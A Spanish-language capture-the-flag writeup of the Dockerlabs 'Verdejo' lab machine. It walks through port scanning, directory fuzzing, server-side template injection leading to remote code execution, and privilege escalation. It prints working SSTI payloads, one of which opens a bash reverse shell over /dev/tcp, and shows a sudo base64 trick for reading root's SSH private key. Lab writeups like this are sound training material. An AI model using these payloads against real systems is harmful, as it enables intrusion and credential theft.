---
layout: single
title: Verdejo - Dockerlabs
excerpt: "Hacking"
date: 2021-05-22
classes: wide
header:
  teaser: /assets/images/dockerlabs_image_verdejo.png
  teaser_home_page: true
  icon: /assets/images/dockerlabs_icon.png
categories:
  - Writeup
---

<iframe width="560" height="315" src="https://www.youtube.com/embed/_q1izR4c0mg" 
title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; 
encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>



🔍 Escaneo y Reconocimiento de Puertos

Una vez desplegada la máquina víctima, lo primero que debemos hacer es verificar su disponibilidad mediante un ping:

ping -c 1 172.17.0.2

La respuesta TTL=64 sugiere que se trata de un sistema basado en Linux.
Escaneo de Puertos con Nmap

Utilizamos nmap para descubrir todos los puertos abiertos:

nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv -oG allPorts 172.17.0.2

Opciones utilizadas:

    -sS: Escaneo SYN.

    -p-: Escanea todos los puertos (1-65535).

    --open: Muestra solo los puertos abiertos.

    --min-rate 5000: Establece un mínimo de 5000 paquetes por segundo.

    -n: Evita resolución DNS.

    -Pn: Omite la detección de hosts.

    -vvv: Salida detallada.

    -oG allPorts: Guarda los resultados en formato grepable.

Resultado:

Puerto 22 - SSH  
Puerto 80 - HTTP  
Puerto 8089 - Unknown

![Nmap Scan](IMGs/images/Pasted image 20240527081316.png)
Escaneo de Servicios y Versiones

Ejecutamos un segundo escaneo para obtener detalles de los servicios y versiones:

nmap -sCV -p80 -vvv -oN versionPorts 172.17.0.2

    -sCV: Scripts de enumeración + detección de versiones.

    -p80: Escaneo al puerto HTTP.

    -oN versionPorts: Guarda el resultado en formato legible.

🌐 Enumeración Web

Accedemos al sitio vía navegador con http://172.17.0.2, pero solo encontramos la página por defecto de Apache.
Descubrimiento de Directorios con Gobuster

Realizamos fuzzing para detectar directorios ocultos:

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php

    -u: URL objetivo.

    -w: Wordlist utilizada.

    -x: Extensiones a buscar (ej. .php).

Resultado: Se detecta el directorio /javascript.

![Gobuster Result](IMGs/images/Pasted image 20240527082502.png)

Al intentar acceder, obtenemos un estado 403 Forbidden. Exploramos el puerto 8089 para más pistas.
🧪 Detección de Vulnerabilidades Web

En http://172.17.0.2:8089 encontramos una aplicación que permite ingresar texto.

![Web Form](IMGs/images/Pasted image 20240527082710.png)
Prueba de HTML Injection

Probamos inyectar HTML básico en la URL:

http://172.17.0.2:8089/?user=<h1>HTMLinjection</h1>

Resultado:

![HTML Injection](IMGs/images/Pasted image 20240527083610.png)

La respuesta confirma que el HTML se interpreta correctamente.
Prueba de SSTI (Server-Side Template Injection)

Probamos SSTI con:

http://172.17.0.2:8089/?user={{3*4}}

![SSTI](IMGs/images/Pasted image 20240527084023.png)

El resultado indica que el código fue evaluado del lado del servidor. Confirmamos una vulnerabilidad SSTI.
🛠️ Explotación de SSTI para RCE

Usamos un payload conocido para ejecutar comandos remotos:

{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

📚 Referencia: PayloadsAllTheThings - SSTI
Análisis del Payload

    self.__init__: Referencia al constructor del objeto.

    .__globals__: Accede al entorno global.

    .__builtins__: Accede a funciones internas de Python.

    __import__('os'): Importa el módulo os.

    .popen('id').read(): Ejecuta id y lee la salida.

Acceso a Archivos

Probamos leer archivos con:

{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/hosts').read() }}

![Read /etc/hosts](IMGs/images/Pasted image 20240527085127.png)
📞 Reverse Shell

Ponemos nuestra máquina a la escucha:

nc -nlvp 443

Y enviamos este payload desde la web:

http://172.17.0.2:8089/?user={{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/443 0>&1\'').read()}}

¡Shell recibida!

![Reverse Shell](IMGs/images/Pasted image 20240527090356.png)
🔐 Escalada de Privilegios

Verificamos permisos sudo:

sudo -l

Vemos que podemos ejecutar el binario base64 como root. Lo aprovechamos para leer el archivo privado SSH del usuario root:

sudo base64 /root/.ssh/id_rsa | base64 --decode

Resultado: clave privada de root.

-----BEGIN OPENSSH PRIVATE KEY-----
... (clave completa) ...
-----END OPENSSH PRIVATE KEY-----

**Con esta clave podemos conectarnos vía SSH como root.**




